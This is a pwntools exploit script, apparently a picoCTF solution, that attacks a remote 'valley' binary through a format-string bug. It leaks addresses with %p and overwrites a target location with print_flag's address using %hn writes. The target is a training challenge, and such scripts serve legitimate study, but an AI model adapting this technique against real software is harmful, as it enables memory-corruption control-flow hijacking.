#!/usr/bin/env python3
from pwn import *
exe = ELF('valley', checksec = False)
context.binary = exe

# p = process(exe.path)
p = remote('shape-facility.picoctf.net', 58324)

# input()
#stage 1 leak exe
p.recvline()
p.sendline(f'%27$p'.encode())
p.recvuntil(b': ')
exe_leak = int(p.recvline()[:-1],16)
exe.address = exe_leak - 0x1401
log.info("exe leak: " + hex(exe_leak))
log.info("exe base: " + hex(exe.address))

#stage 2 leak rtld global
p.sendline(f'%20$p'.encode())
p.recvuntil(b': ')
adrr = int(p.recvline()[:-1],16) - 0x8
log.info("adrr: " + hex(adrr))

#stage 3 get shell

package = {
    (exe.sym['print_flag'] >> 0) & 0xffff : adrr,
    (exe.sym['print_flag'] >> 16) & 0xffff : adrr + 2,
    (exe.sym['print_flag'] >> 32) & 0xffff : adrr + 4,
}

order = sorted(package)

payload = f'%{order[0]}c%14$hn'.encode()
payload += f'%{order[1] - order[0]}c%15$hn'.encode()
payload += f'%{order[2] - order[1]}c%16$hn'.encode()
payload = payload.ljust(0x40, b'a')
payload += flat(
    package[order[0]],
    package[order[1]],
    package[order[2]],
)
p.sendline(payload)
p.sendline(b'exit')

p.interactive()